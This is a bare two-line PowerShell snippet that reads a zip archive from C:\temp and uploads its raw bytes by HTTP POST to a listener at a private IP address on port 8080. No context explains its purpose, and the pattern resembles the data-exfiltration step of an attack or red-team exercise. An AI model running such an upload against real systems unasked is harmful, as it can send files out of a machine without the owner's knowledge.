$bytes = [System.IO.File]::ReadAllBytes("C:\temp\output_7za.zip")
Invoke-WebRequest -Uri "http://10.0.17.36:8080/upload" -Method POST -Body $bytes -ContentType "application/octet-stream"
